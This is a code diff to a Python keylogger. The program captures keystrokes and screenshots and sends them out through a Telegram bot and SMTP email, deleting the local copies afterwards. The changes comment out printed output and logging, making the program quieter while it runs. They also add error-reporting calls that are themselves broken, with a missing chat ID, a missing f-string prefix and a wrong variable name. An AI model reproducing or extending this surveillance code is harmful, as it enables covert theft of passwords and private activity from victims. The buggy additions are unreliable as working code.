@@ -10,6 +10,8 @@ from aiogram import Bot, Dispatcher
 from aiogram.filters import Command
 from aiogram.types import FSInputFile, Message
 
+os.mkdir("logs")
+os.mkdir("screenshots")
 bot = Bot("")
 dp = Dispatcher()
 
@@ -33,7 +35,8 @@ async def send_periodic_files(chat_id: int, interval: int):
                 await bot.send_document(chat_id=chat_id, document=FSInputFile(log_file))
                 os.remove(log_file)  # Удаляем лог-файл после успешной отправки
             except Exception as e:
-                print(f"Ошибка отправки {log_file}: {e}")
+                await bot.send_message("Ошибка отправки {log_file}: {e}")
+                # print(f"Ошибка отправки {log_file}: {e}")
 
         for photo in photo_files:
             photo_file = os.path.join("screenshots", photo)
@@ -41,7 +44,8 @@ async def send_periodic_files(chat_id: int, interval: int):
                 await bot.send_photo(chat_id=chat_id, photo=FSInputFile(photo_file))
                 os.remove(photo_file)
             except Exception as e:
-                print(f"Ошибка отправки {photo_file}: {e}")
+                await bot.send_message("Ошибка отправки {log_file}: {e}")
+                # print(f"Ошибка отправки {photo_file}: {e}")
 
             await asyncio.sleep(1)
 
@@ -127,7 +131,7 @@ class Keylogger:
                 + self.log,
                 file=f,
             )
-        print(f"[+] Saved {self.filename}.txt")
+        # print(f"[+] Saved {self.filename}.txt")
 
     async def sendmail(self, email, password, message):
         # управляет подключением к SMTP-серверу
@@ -150,7 +154,6 @@ class Keylogger:
             if self.report_method == "email":
                 await self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             elif self.report_method == "file":
-                print(123123)
                 await self.report_to_file()
             self.start_dt = datetime.now()
         self.log = ""
@@ -169,5 +172,5 @@ async def main():
 
 
 if __name__ == "__main__":
-    logging.basicConfig(level=logging.INFO)
+    # logging.basicConfig(level=logging.INFO)
     asyncio.run(main())
